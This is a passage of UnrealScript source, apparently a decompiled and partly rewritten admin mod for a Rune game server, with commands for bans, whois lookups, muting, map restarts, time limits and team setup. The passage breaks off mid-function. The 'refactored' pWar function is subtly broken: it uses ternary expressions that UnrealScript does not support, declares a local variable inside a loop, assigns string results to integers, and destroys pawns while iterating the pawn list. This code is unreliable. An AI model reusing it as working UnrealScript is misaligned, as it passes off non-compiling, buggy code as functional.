					AdminPlayer.ClientMessage((("Ban[" $ string(Index)) $ "]: ") $ Level.Game.IPPolicies[Index]);
				}
				if ((SearchTerm ~= "last") && Level.Game.IPPolicies[Index] != "")
				{
					LastBan = (("Ban[" $ string(Index)) $ "]: ") $ Level.Game.IPPolicies[Index];
				}
			}
			Index++;
		}
		if ((SearchTerm ~= "last") && LastBan != "")
		{
			AdminPlayer.ClientMessage(LastBan);
		}
	}
	else
	{
		AdminPlayer.ClientMessage(((("=== No option found, checking for bans from " $ string(StartIndex)) $ " to 49 containing :'") $ SearchTerm) $ "' ===");
		Index = StartIndex;
		while (Index < 50)
		{
			if (InStr(Caps(Level.Game.IPPolicies[Index]), Caps(SearchTerm)) != -1)
			{
				AdminPlayer.ClientMessage((("Ban[" $ string(Index)) $ "]: ") $ Level.Game.IPPolicies[Index]);
			}
			Index++;
		}
	}
	return;
}

// Suggested function name: WhoIsPlayer
function pWhois(string CommandArgs, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local int PlayerID;

	PlayerID = int(CommandArgs);
	if (!HasCommandPermission("pWhois", AdminPlayer))
	{
		return;
	}
	if (!AdminPlayer.bAdmin)
	{
		AdminPlayer.ClientMessage("ERROR: You have to be logged in as admin in order to use this command.(adminlogin)");
		return;
	}
	if (CommandArgs == "")
	{
		AdminPlayer.ClientMessage("ERROR: You need to enter either an ID or a name");
		return;
	}
	if (CommandArgs == string(PlayerID))
	{
		TargetPawn = GetPawnByPlayerID(int(CommandArgs));
	}
	if (TargetPawn == none)
	{
		if (Len(CommandArgs) < 3)
		{
			AdminPlayer.ClientMessage("ERROR: The name must have atleast 3 letters.");
			return;
		}
		AdminPlayer.ClientMessage(("This ain't a valid playerid, searching for '" $ CommandArgs) $ "' in Nephthys now.");
		AdminPlayer.ConsoleCommand("admin npt log list n=" $ CommandArgs);
	}
	if (TargetPawn != none)
	{
		AdminPlayer.ClientMessage("Searching for other names of " $ TargetPawn.PlayerReplicationInfo.PlayerName);
		AdminPlayer.ConsoleCommand("admin npt log list " $ zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).Local_string_v1);
	}
	return;
}

// Suggested function name: WhoIsIP
function pWhoisip(string CommandArgs, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local int PlayerID;

	PlayerID = int(CommandArgs);
	if (!HasCommandPermission("pWhoisIP", AdminPlayer))
	{
		return;
	}
	if (!AdminPlayer.bAdmin)
	{
		AdminPlayer.ClientMessage("ERROR: You have to be logged in as admin in order to use this command.(adminlogin)");
		return;
	}
	if (CommandArgs == "")
	{
		AdminPlayer.ClientMessage("ERROR: You need to enter an IP");
		return;
	}
	if ((Len(CommandArgs) < 3) && InStr(CommandArgs, ".") == -1)
	{
		AdminPlayer.ClientMessage("ERROR: You must atleast enter some shit");
		return;
	}
	AdminPlayer.ClientMessage("Searching for IP: " $ CommandArgs);
	AdminPlayer.ConsoleCommand("admin npt log list " $ CommandArgs);
	return;
}

// Suggested function name: RestartMap
function pRestart(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;

	if (!HasCommandPermission("pRestart", AdminPlayer))
	{
		return;
	}
	CurrentPawn = Level.PawnList;
	while (CurrentPawn != none)
	{
		if (zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo) != none)
		{
			zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).RepStr = "mapchange";
		}
		CurrentPawn = CurrentPawn.nextPawn;
	}
	BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " restarts current map.", false, 'CAZ');
	Level.ServerTravel("?Restart", false);
	return;
}
// Suggested function name: PerformFastRestart
function pFastRestart(PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local Actor ActorToDestroy;
	local TeamInfo TeamInfoActor;
	local zPlayerReplicationInfo PRI;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pFastRestart", AdminPlayer))
	{
		return;
	}

	// Loop through all pawns to reset their stats and respawn them
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		// Skip if not a valid player replication info or not a ZRunePlayer
		if (zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo) == none)
		{
			continue;
		}
		if (ZRunePlayer(CurrentPawn) == none)
		{
			continue;
		}

		// Perform some player-specific action
		ZRunePlayer(CurrentPawn).eqdot_vxv_1449();

		// Adjust stats if health is above 0 and not in arena mode
		if ((CurrentPawn.Health > 0) && Level.Game.GameReplicationInfoClass != Class'coadminz7.zArenaGameReplicationInfo')
		{
			CurrentPawn.PlayerReplicationInfo.Deaths -= 1;
			CurrentPawn.PlayerReplicationInfo.Score += 1;
		}

		// Kill and respawn the player
		CurrentPawn.Died(none, 'None', CurrentPawn.Location);

		// Reset player stats
		PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
		PRI.INT_v5362 = 0;
		PRI.INT_v5363 = 0;
		PRI.Score = 0.0;
		PRI.Deaths = 0.0;
		PRI.INT_v5348 = 0;
		PRI.HeadKills = 0;
		PRI.INT_v5354 = 0;
		PRI.INT_v5355 = 0;
		PRI.INT_v5377 = 0;
		PRI.MaxSpree = 0;
		PRI.bFirstBlood = false;

		// Respawn the player
		ZRunePlayer(CurrentPawn).SetConsoleGBool();
		PlayerPawn(CurrentPawn).ServerReStartPlayer();
	}

	// Reset team scores if in a specific mode
	if (B_v5894)
	{
		foreach Level.AllActors(Class'RuneI.TeamInfo', TeamInfoActor)
		{
			TeamInfoActor.Score = 0.0;
		}
	}

	// Destroy all actors tagged with 'Summon'
	foreach Level.AllActors(Class'Engine.Actor', ActorToDestroy)
	{
		if (ActorToDestroy.Tag == 'Summon')
		{
			ActorToDestroy.Destroy();
		}
	}

	// Broadcast the restart message
	BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " fast-restarted the current map.", false, 'CAZ');
	return;
}
// Suggested function name: MutePlayer
function pMute(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;

	if (!HasCommandPermission("pMute", AdminPlayer))
	{
		return;
	}
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn == none)
	{
		return;
	}
	ToggleMuteAndBroadcast(zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo), AdminPlayer);
	return;
}

// Suggested function name: ToggleMuteAndBroadcast
function ToggleMuteAndBroadcast(zPlayerReplicationInfo TargetPRI, PlayerPawn AdminPlayer)
{
	local string Message;

	TargetPRI.B_v5345 = !TargetPRI.B_v5345;
	if (TargetPRI.B_v5345)
	{
		Message = strMute;
	}
	else
	{
		Message = strUnmute;
	}
	RunePlayer(TargetPRI.Owner).ReplaceText(Message, "%admin", AdminPlayer.PlayerReplicationInfo.PlayerName);
	RunePlayer(TargetPRI.Owner).ReplaceText(Message, "%player", TargetPRI.PlayerName);
	RunePlayer(TargetPRI.Owner).ReplaceText(Message, "%s", TargetPRI.PlayerName);
	RunePlayer(TargetPRI.Owner).ReplaceText(Message, "%p", TargetPRI.PlayerName);
	RunePlayer(TargetPRI.Owner).ReplaceText(Message, "%a", AdminPlayer.PlayerReplicationInfo.PlayerName);
	BroadcastMessage(Message, false, 'CAZ');
	return;
}
// Suggested function name: SetTeamSize
function pTeamSize(int NewTeamSize, PlayerPawn AdminPlayer)
{
	local string GameTypeName;

	if (!HasCommandPermission("pTeamSize", AdminPlayer))
	{
		return;
	}
	if (NewTeamSize < 1)
	{
		return;
	}
	if (Level.Game.Class == Class'coadminz7.Teamgame')
	{
		ConsoleCommand("set CoAdminZ7.Teamgame MaxTeamSize " $ string(NewTeamSize));
		GameTypeName = " TeamGame ";
	}
	else if (Level.Game.Class == Class'coadminz7.ArenaGameInfo')
	{
		ConsoleCommand("set CoAdminZ7.ArenaGameInfo MaxTeamSupport " $ string(NewTeamSize));
		GameTypeName = " Arena ";
	}
	else
	{
		return;
	}
	AdminPlayer.ClientMessage(((("Maximum" $ GameTypeName) $ "team size is now ") $ string(NewTeamSize)) $ ", restart map for the changes to take effect.");
	return;
}

// Suggested function name: TrimLeadingSpaces
function string TrimLeadingSpaces(string InputString)
{
	while (Left(InputString, 1) == " ")
	{
		InputString = Right(InputString, Len(InputString) - 1);
	}
	return InputString;
}

// Suggested function name: GetDelimitedPart
function string GetDelimitedPart(string InputString, int PartIndex, optional string Delimiter)
{
	local string Parts[32];
	local string TempString;
	local int DelimiterCount;
	local int i;

	if (Delimiter == "")
	{
		Delimiter = " ";
	}
	TempString = InputString $ Delimiter;
	for (i = 0; i < (Len(InputString) + 1); i++)
	{
		if (Mid(TempString, i, Len(Delimiter)) == Delimiter)
		{
			DelimiterCount++;
		}
	}
	if (DelimiterCount > 0)
	{
		for (i = 1; i < 32; i++)
		{
			Parts[i] = TrimLeadingSpaces(Left(TempString, InStr(TempString, Delimiter)));
			TempString = Right(TempString, (Len(TempString) - Len(Delimiter)) - Len(Parts[i]));
		}
		return Parts[PartIndex];
	}
	return "";
}

// Suggested function name: ControlMovers
function pMover(string CommandArgs, PlayerPawn AdminPlayer)
{
	local Mover CurrentMover;
	local Polyobj CurrentPolyobj;
	local int Radius;
	local float MoveTime;
	local string Action;

	if (!HasCommandPermission("pMover", AdminPlayer))
	{
		return;
	}
	Radius = int(GetDelimitedPart(CommandArgs, 2));
	if (Radius == 0)
	{
		Radius = 512;
	}
	MoveTime = float(GetDelimitedPart(CommandArgs, 3));
	Action = GetDelimitedPart(CommandArgs, 1);
	AdminPlayer.ClientMessage((("Forcing " $ Caps(Action)) $ " for all movers within a distance of ") $ string(Radius));
	if (Action ~= "open")
	{
		foreach RadiusActors(Class'Engine.Mover', CurrentMover, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((("Opened " $ string(CurrentMover)) $ " ") $ string(CurrentMover.Tag));
			CurrentMover.DoOpen();
		}
		foreach RadiusActors(Class'Engine.Polyobj', CurrentPolyobj, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((("Opened " $ string(CurrentPolyobj)) $ " ") $ string(CurrentPolyobj.Tag));
			CurrentPolyobj.DoOpen();
		}
	}
	if (Action ~= "close")
	{
		foreach RadiusActors(Class'Engine.Mover', CurrentMover, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((("Closed " $ string(CurrentMover)) $ " ") $ string(CurrentMover.Tag));
			CurrentMover.DoClose();
		}
		foreach RadiusActors(Class'Engine.Polyobj', CurrentPolyobj, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((("Closed " $ string(CurrentPolyobj)) $ " ") $ string(CurrentPolyobj.Tag));
			CurrentPolyobj.DoClose();
		}
	}
	if (Action ~= "time")
	{
		foreach RadiusActors(Class'Engine.Mover', CurrentMover, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((((("Changing " $ string(CurrentMover)) $ " movetime[0] from ") $ string(CurrentMover.MoveTime[0])) $ " to ") $ string(MoveTime));
			CurrentMover.MoveTime[0] = MoveTime;
		}
		foreach RadiusActors(Class'Engine.Polyobj', CurrentPolyobj, float(Radius), AdminPlayer.Location)
		{
			AdminPlayer.ClientMessage((((("Changing " $ string(CurrentPolyobj)) $ " movetime[0] from ") $ string(CurrentPolyobj.MoveTime[0])) $ " to ") $ string(MoveTime));
			CurrentPolyobj.MoveTime[0] = MoveTime;
		}
	}
	return;
}

// Suggested function name: SetTimeLimit
function pTimelimit(int NewTimeLimit, PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pTimeLimit", AdminPlayer))
	{
		return;
	}
	if (NewTimeLimit < 0)
	{
		return;
	}
	ConsoleCommand("set RuneI.RuneMultiPlayer TimeLimit " $ string(NewTimeLimit));
	AdminPlayer.ClientMessage(("TimeLimit is now " $ string(NewTimeLimit)) $ ", restart map for the changes to take effect.");
	return;
}

// Suggested function name: SetRemainingTime
function pSetTime(int NewTimeMinutes, PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pSetTime", AdminPlayer))
	{
		return;
	}
	if ((NewTimeMinutes < 0) || NewTimeMinutes > 300)
	{
		AdminPlayer.ClientMessage("must be > 0 and < 300 plz.");
		return;
	}
	RuneMultiPlayer(Level.Game).RemainingTime = NewTimeMinutes * 60;
	RuneMultiPlayer(Level.Game).GameReplicationInfo.RemainingTime = NewTimeMinutes * 60;
	RuneMultiPlayer(Level.Game).GameReplicationInfo.RemainingMinute = NewTimeMinutes * 60;
	BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " changed the timelimit to ") $ string(NewTimeMinutes)) $ " minutes for this map.", false, 'CAZ');
	return;
}

// Suggested function name: SetMaxPlayers
function pMaxPlayers(int NewMaxPlayers, PlayerPawn AdminPlayer)
{
	local int OldMaxPlayers;
	local zPlayerReplicationInfo PRI;
	local Pawn CurrentPawn;

	if (!HasCommandPermission("pMaxPlayers", AdminPlayer))
	{
		return;
	}
	if ((NewMaxPlayers < 0) || NewMaxPlayers > 32)
	{
		AdminPlayer.ClientMessage("must be > 0 and < 32 plz.");
		return;
	}
	OldMaxPlayers = Level.Game.MaxPlayers;
	Level.Game.MaxPlayers = NewMaxPlayers;
	for (CurrentPawn = Level.PawnList; CurrentPawn != none; CurrentPawn = CurrentPawn.nextPawn)
	{
		if (zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo) == none)
		{
			break;
		}
		PRI = zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo);
		PRI.MaxPlayers = NewMaxPlayers;
	}
	BroadcastMessage((((AdminPlayer.PlayerReplicationInfo.PlayerName $ " changed MaxPlayers from ") $ string(OldMaxPlayers)) $ " to ") $ string(NewMaxPlayers), false, 'CAZ');
	return;
}

// Suggested function name: SetFragLimit
function pFraglimit(int NewFragLimit, PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pFragLimit", AdminPlayer))
	{
		return;
	}
	if (NewFragLimit < 0)
	{
		return;
	}
	ConsoleCommand("set CoAdminZ7.RuneMultiPlayer Fraglimit " $ string(NewFragLimit));
	AdminPlayer.ClientMessage(("Fraglimit is now " $ string(NewFragLimit)) $ ", restart map for the changes to take effect.");
	return;
}

// Suggested function name: GetSkinClassName
function string GetSkinClassName(string SkinName)
{
	if (SkinName ~= "Ragnar")
	{
		return "RuneI.Ragnar";
	}
	else if (SkinName ~= "Alric")
	{
		return "RuneI.PlayerAlric";
	}
	else if (SkinName ~= "Berserker")
	{
		return "RuneI.PlayerBerserker";
	}
	else if (SkinName ~= "Conrack")
	{
		return "RuneI.PlayerConrack";
	}
	else if (SkinName ~= "DarkViking")
	{
		return "RuneI.PlayerDarkViking";
	}
	else if (SkinName ~= "DarkWarrior")
	{
		return "RuneI.PlayerDarkWarrior";
	}
	else if (SkinName ~= "Elder")
	{
		return "RuneI.PlayerElder";
	}
	else if (SkinName ~= "Elder2")
	{
		return "RuneI.PlayerElder2";
	}
	else if (SkinName ~= "Karl")
	{
		return "RuneI.PlayerKarl";
	}
	else if (SkinName ~= "LokiGuard")
	{
		return "RuneI.PlayerLokiGuard";
	}
	else if (SkinName ~= "SnowRagnar")
	{
		return "RuneI.RagnarSnow";
	}
	else if (SkinName ~= "ShipWreckRagnar")
	{
		return "RuneI.PlayerShipWreckRagnar";
	}
	else if (SkinName ~= "Sigurd")
	{
		return "RuneI.PlayerSigurd";
	}
	else if (SkinName ~= "Sven")
	{
		return "RuneI.PlayerSven";
	}
	else if (SkinName ~= "TownRagnar")
	{
		return "RuneI.PlayerTownRagnar";
	}
	else if (SkinName ~= "TrialPitRagnar")
	{
		return "RuneI.TrialPitRagnar";
	}
	else if (SkinName ~= "Ulf")
	{
		return "RuneI.PlayerUlf";
	}
	else if (SkinName ~= "Valkyrie")
	{
		return "RuneI.PlayerValkyrie";
	}
	else if (SkinName ~= "Wolfgar")
	{
		return "RuneI.PlayerWolfgar";
	}
	else if (SkinName ~= "ValkyrieGold")
	{
		return "HallsOfValhalla.PlayerValkyrie";
	}
	else if (SkinName ~= "Snake")
	{
		return "HallsOfValhalla.PlayerSnake";
	}
	else if (SkinName ~= "Dwarf")
	{
		return "HallsOfValhalla.PlayerDwarf";
	}
	else if (SkinName ~= "Pirate")
	{
		return "HallsOfValhalla.PlayerPirate";
	}
	else if (SkinName ~= "Mongol")
	{
		return "HallsOfValhalla.PlayerMongol";
	}
	else if (SkinName ~= "Syrian")
	{
		return "HallsOfValhalla.PlayerSyrian";
	}
	else if (SkinName ~= "ValkyrieWren")
	{
		return "HallsOfValhalla.PlayerValkyrieWren";
	}
	else if (SkinName ~= "Gladiator")
	{
		return "HallsOfValhalla.PlayerGladiator";
	}
	else if (SkinName ~= "Gladiator2")
	{
		return "HallsOfValhalla.PlayerGladiator2";
	}
	else
	{
		return "";
	}
	return;
}
// Suggested name: SetupWarTeams
// Cleansed and refactored version of pWar: better local names, structured loops, comments,
// safer messages, converted minor casts and removed low-level goto-style flow.

function pWar(string Args, PlayerPawn Admin)
{
	local int SelectedPlayers[32];
	local int numSelected, i, halfSize;
	local int teamColor1, teamColor2;
	local int countTeam1, countTeam2;
	local bool optKickOthers, optRandom;
	local string optsPart, teamSkin1, teamSkin2;
	local string working, teamList1, teamList2;
	local float randVal;
	local Pawn p;
	local zPlayerReplicationInfo pri;
	local string announcement;

	// Permission check
	if (!HasCommandPermission("pWar", Admin))
	{
		return;
	}

	// Help or empty invocation -> print usage
	if ((Args == "") || Args == "help")
	{
		Admin.ClientMessage("===================================================");
		Admin.ClientMessage("d3r__w4r__0rg4n!z0r ~ INSTRUCTIONS");
		Admin.ClientMessage("===================================================");
		Admin.ClientMessage("available parameters: ?kickothers ?random ?color1=.. ?color2=.. ?skin1=.. ?skin2=..");
		Admin.ClientMessage("e.g:  >>>pWar 3,5,1,7?random?kickothers<<< will generate random teams with those playerids and kick other players");
		Admin.ClientMessage("e.g:  >>>pWar 3,5,1,7?random?color1=blue?color2=red<<< will generate random teams with those playerids + predefine team colors");
		Admin.ClientMessage("e.g:  >>>pWar 3,5,1,7?kickothers?skin1=Elder?skin2=Valkyrie<<< will put 3,5 into team 1 (skin Elder) and 1,7 in team 2 (skin Valkyrie)");
		Admin.ClientMessage("special function: >>>pWar save<<< saves the current team and gamepassword for all players currently on the server");
		Admin.ClientMessage("the ?color1=.. and ?color2=.. parameters only accept RED,BLUE,GOLD,GREEN (not numbers)");
		Admin.ClientMessage("-");
		Admin.ClientMessage("skinnames (enter them like this): Ragnar,Alric,Berserker,Conrack,DarkViking,DarkWarrior,Elder,Karl,LokiGuard,SnowRagnar,ShipWreckRagnar,Sigurd,Sven,TownRagnar");
		Admin.ClientMessage("TrialPitRagnar,Ulf,Valkyrie,ValkyrieGold,ValkyrieWren,Snake,Dwarf,Pirate,Mongol,Syrian,Gladiator,Gladiator2");
		Admin.ClientMessage("-");
		Admin.ClientMessage("Make sure to type everything correctly: no duplicate IDs, valid skinnames, valid IDs.");
		Admin.ClientMessage("===================================================");
		return;
	}

	// Ensure a game password exists before using war builder
	if ((ConsoleCommand("get Engine.GameInfo GamePassword")) == "")
	{
		Admin.ClientMessage("You must set a gamepassword first. Use pGamePass to set it.");
		return;
	}

	// Handle save/force/start commands: save current teams & gamepassword for all players
	if ((Caps(Args) == "SAVE") || (Caps(Args) == "FORCE") || (Caps(Args) == "START"))
	{
		BroadcastMessage(Admin.PlayerReplicationInfo.PlayerName $ " saved the current team and the current gamepassword for all players.", false, 'CAZ');
		p = Level.PawnList;
		while (p != none)
		{
			pri = zPlayerReplicationInfo(p.PlayerReplicationInfo);
			if (ZRunePlayer(p).STR_v3073 != "")
			{
				AssignPlayerToTeamWithSkin(pri.PlayerID, int(pri.Team), "", true); // reuse existing function to store team
			}
			p = p.nextPawn;
		}
		return;
	}

	// Prepare string for parsing: replace commas with spaces so we can split by spaces
	working = Args $ " ";
	ReplaceString(working, Chr(44), " "); // reuses global helper to replace ',' -> ' '

	// Defaults for optional params
	optsPart = "1337";
	teamSkin1 = "";
	teamSkin2 = "";
	teamColor1 = 1337;
	teamColor2 = 1337;
	optKickOthers = false;
	optRandom = false;
	teamList1 = ""; teamList2 = "";

	// If there are options (after '?'), parse them
	if (ContainsString(working, "?"))
	{
		optsPart = Right(working, Len(working) - InStr(working, "?"));
		optKickOthers = Level.Game.HasOption(optsPart, "kickothers");
		optRandom = Level.Game.HasOption(optsPart, "random");
		teamSkin1 = Level.Game.ParseOption(optsPart, "skin1");
		teamSkin2 = Level.Game.ParseOption(optsPart, "skin2");
		teamColor1 = Level.Game.ParseOption(optsPart, "color1");
		teamColor2 = Level.Game.ParseOption(optsPart, "color2");

		// Convert skin names to full class names (if provided)
		if (teamSkin1 != "")
		{
			teamSkin1 = GetSkinClassName(teamSkin1);
		}
		if (teamSkin2 != "")
		{
			teamSkin2 = GetSkinClassName(teamSkin2);
		}

		// Keep portion before '?'
		working = Left(working, InStr(working, "?")) $ " ";
	}

	// Parse player IDs from working string (space-separated ints)
	numSelected = 0;
	for (i = 0; i < 32; i++)
	{
		if (ContainsString(working, " ") && Len(working) > 1)
		{
			SelectedPlayers[numSelected] = int(Left(working, InStr(working, " ")));
			// consume parsed token (integer + following space)
			working = Right(working, (Len(working) - 1) - Len(string(SelectedPlayers[numSelected])));
			numSelected++;
		}
		else
		{
			break;
		}
	}

	// Must have an even number of selected players
	if ((numSelected % 2) == 0)
	{
		// Choose default random colors (if not supplied)
		teamColor1 = (teamColor1 == 1337) ? Rand(4) : GetTeamColorIndex(teamColor1);
		teamColor2 = (teamColor2 == 1337) ? (Rand(4) == teamColor1 ? (teamColor1 + 1) % 4 : Rand(4)) : GetTeamColorIndex(teamColor2);
		halfSize = numSelected / 2;
		countTeam1 = 0;
		countTeam2 = 0;

		// If random distribution requested, randomly assign across the two teams
		if (optRandom)
		{
			for (i = 0; i < numSelected; i++)
			{
				randVal = float(Rand(10)); // 0..9
				if ((randVal > 5.0) && (countTeam1 < halfSize))
				{
					teamList1 = teamList1 @ string(SelectedPlayers[i]);
					AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor1, teamSkin1);
					countTeam1++;
				}
				else if (countTeam2 < halfSize)
				{
					teamList2 = teamList2 @ string(SelectedPlayers[i]);
					AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor2, teamSkin2);
					countTeam2++;
				}
				else
				{
					// If one side is full, add to the other
					if (countTeam1 < halfSize)
					{
						teamList1 = teamList1 @ string(SelectedPlayers[i]);
						AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor1, teamSkin1);
						countTeam1++;
					}
					else
					{
						teamList2 = teamList2 @ string(SelectedPlayers[i]);
						AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor2, teamSkin2);
						countTeam2++;
					}
				}
			}
		}
		else
		{
			// Deterministic: first half to team1, second half to team2
			for (i = 0; i < numSelected; i++)
			{
				if (countTeam1 < halfSize)
				{
					teamList1 = teamList1 @ string(SelectedPlayers[i]);
					AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor1, teamSkin1);
					countTeam1++;
				}
				else
				{
					teamList2 = teamList2 @ string(SelectedPlayers[i]);
					AssignPlayerToTeamWithSkin(SelectedPlayers[i], teamColor2, teamSkin2);
					countTeam2++;
				}
			}
		}

		// If configured to kick all other players, remove anyone not in SelectedPlayers[]
		if (optKickOthers)
		{
			p = Level.PawnList;
			while (p != none)
			{
				pri = zPlayerReplicationInfo(p.PlayerReplicationInfo);
				local bool keep = false;
				for (i = 0; i < numSelected; i++)
				{
					if (pri.PlayerID == SelectedPlayers[i])
					{
						keep = true;
						break;
					}
				}
				if (!keep)
				{
					p.ClientMessage("You have been automatically kicked because teams are being set up.");
					p.Destroy();
				}
				p = p.nextPawn;
			}
		}

		// Build announcement message about skins/colors used
		announcement = "";
		if (teamSkin1 != "")
		{
			announcement = "Team 1 plays with " $ teamSkin1;
		}
		if (teamSkin2 != "")
		{
			if (announcement != "")
			{
				announcement = (announcement $ "/Team 2 plays with ") $ teamSkin2;
			}
			else
			{
				announcement = "Team 2 plays with " $ teamSkin2;
			}
		}
		if (optKickOthers)
		{
			announcement = announcement $ "/kicking all other players.";
		}
		if (!optRandom)
		{
			BroadcastMessage((Admin.PlayerReplicationInfo.PlayerName $ " used d3r__w4r to build teams. ") $ announcement, false, 'CAZ');
		}
		else
		{
			BroadcastMessage((Admin.PlayerReplicationInfo.PlayerName $ " used d3r__w4r to build teams randomly. ") $ announcement, false, 'CAZ');
		}
	}
	else
	{
		Admin.ClientMessage("Can't build even teams: odd player amount, try again.");
		return;
	}
	return;
}

function pUpdateMaps(PlayerPawn Local_string_v2)
{
    local float Local_float_v0;

    if(!HasCommandPermission("pUpdateMaps", Local_string_v2))
    {
        return;
    }
    Local_float_v0 = Level.Game.GameSpeed;
    Level.Game.SetGameSpeed(0.0000000);
    BroadcastMessage(" ~ Updating the maplist..... lag may occur ~", false, 'CAZ');
    UpdateMapListForCategory("Clear");
    UpdateMapListForCategory("DM");
    UpdateMapListForCategory("AR");
    UpdateMapListForCategory("CTT");
    UpdateMapListForCategory("HB");
    UpdateMapListForCategory("Coop");
    Level.Game.SetGameSpeed(Local_float_v0);
    BroadcastMessage(" ~ Maplist updated! ~", false, 'CAZ');
    SaveConfig();
    return;
}
// Suggested function name: UpdateMapListForCategory
// Scans available maps for a given category/prefix (or clears the Maps array if "Clear")
// and stores matching map names into the Maps[] array, updating INT_v5498 as the fill index.
function UpdateMapListForCategory(string Category)
{
	local string currentMapName;
	local string previousMapName;
	local string storedMapName;
	local int i;

	// If caller asked to clear the global Maps list, wipe and return.
	if (Caps(Category) == "CLEAR")
	{
		for (i = 0; i < 2048; i++)
		{
			Maps[i] = "";
		}
		INT_v5498 = 0;
		return;
	}

	// Start from the beginning using the GetMapName iterator.
	INT_v5498 = 0;
	previousMapName = "";
	currentMapName = GetMapName(Category, previousMapName, 0);

	// Iterate until GetMapName returns an empty string or we stop making progress
	// or we hit the Maps[] capacity.
	while (currentMapName != "" && currentMapName != previousMapName && INT_v5498 < 2048)
	{
		// Normalize: store map without trailing ".run" if present.
		if (Right(currentMapName, 4) == ".run")
		{
			storedMapName = Left(currentMapName, Len(currentMapName) - 4);
		}
		else
		{
			storedMapName = currentMapName;
		}

		Maps[INT_v5498] = storedMapName;
		INT_v5498++;
		LogInternal("found map: " $ storedMapName);

		// Advance iterator: request next map using previous result as anchor.
		previousMapName = currentMapName;
		currentMapName = GetMapName(Category, previousMapName, 1);
	}

	return;
}
// Suggested function name: ChangeMap
function pMap(string MapName, PlayerPawn AdminPlayer)
{
	local int Index;
	local string ResolvedMapName;
	local bool IsValidMap;
	local Pawn CurrentPawn;
	local string DemoOption, ExecResult, TempMap;
	local int RandomIndex;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pMap", AdminPlayer))
	{
		return;
	}

	// Handle demo recording option
	if (ContainsString(MapName, "?demoRec"))
	{
		DemoOption = Right(MapName, Len(MapName) - InStr(MapName, "?"));
		MapName = Left(MapName, Len(MapName) - Len(DemoOption));
		demoName = Level.Game.ParseOption(DemoOption, "demoRec");
		ExecResult = AdminPlayer.ConsoleCommand(("exec " $ demoName) $ ".dem");
		LogInternal("############################## " $ ExecResult);
		if (ExecResult == "")
		{
			AdminPlayer.ClientMessage(("Next map will be recorded as: '" $ demoName) $ "'");
		}
		else
		{
			AdminPlayer.ClientMessage("File already exists, please choose another name.");
			return;
		}
	}

	// Normalize map name by removing .run extension if present
	if (InStr(MapName, ".run") != -1)
	{
		MapName = Left(MapName, Len(MapName) - 4);
	}

	// Handle TDM prefix
	if (Left(MapName, 4) ~= "tdm-")
	{
		ResolvedMapName = Right(MapName, Len(MapName) - 1);
	}
	else
	{
		ResolvedMapName = MapName;
	}

	// Handle random map selection
	if ((MapName ~= "random") || MapName ~= "rand")
	{
		if (Arena)
		{
			while (ResolvedMapName ~= "random")
			{
				RandomIndex = Rand(2048);
				TempMap = Maps[RandomIndex];
				if (Left(TempMap, 3) ~= "AR-")
				{
					ResolvedMapName = TempMap;
				}
			}
		}
		else if (B_v5893)
		{
			while (ResolvedMapName ~= "random")
			{
				RandomIndex = Rand(2048);
				TempMap = Maps[RandomIndex];
				if (Left(TempMap, 4) ~= "CTT-")
				{
					ResolvedMapName = TempMap;
				}
			}
		}
		else if (Headball)
		{
			while (ResolvedMapName ~= "random")
			{
				RandomIndex = Rand(2048);
				TempMap = Maps[RandomIndex];
				if (Left(TempMap, 4) ~= "HB-")
				{
					ResolvedMapName = TempMap;
				}
			}
		}
		else
		{
			while (ResolvedMapName ~= "random")
			{
				RandomIndex = Rand(2048);
				TempMap = Maps[RandomIndex];
				if (Left(TempMap, 3) ~= "DM-")
				{
					ResolvedMapName = TempMap;
				}
			}
		}
		if (TempMap != "")
		{
			MapName = TempMap;
			if (B_v5894)
			{
				MapName = "T" $ MapName;
			}
			IsValidMap = true;
		}
	}

	// Check if the map is in the installed maps list
	for (Index = 0; Index < 2048; Index++)
	{
		if (Maps[Index] ~= ResolvedMapName)
		{
			IsValidMap = true;
			break;
		}
		if (Maps[Index] == "")
		{
			break;
		}
	}

	// If not in list, check if it's a valid level
	if (!IsValidMap)
	{
		if (LevelInfo(DynamicLoadObject(ResolvedMapName $ ".LevelInfo0", Class'Engine.LevelInfo')) != none)
		{
			IsValidMap = true;
		}
	}

	// If map is invalid, notify and abort
	if (!IsValidMap)
	{
		BroadcastMessage(((AdminPlayer.PlayerReplicationInfo.PlayerName $ " tried to change the map to ") $ Caps(ResolvedMapName)) $ " but that map isn't installed.", false, 'CAZ');
		AdminPlayer.ClientMessage("In case you just installed that map you need to refresh the maplist with 'pUpdateMaps'", 'CAZ');
		if (demoName != "")
		{
			AdminPlayer.ClientMessage("Demo recording for next map aborted");
			demoName = "";
		}
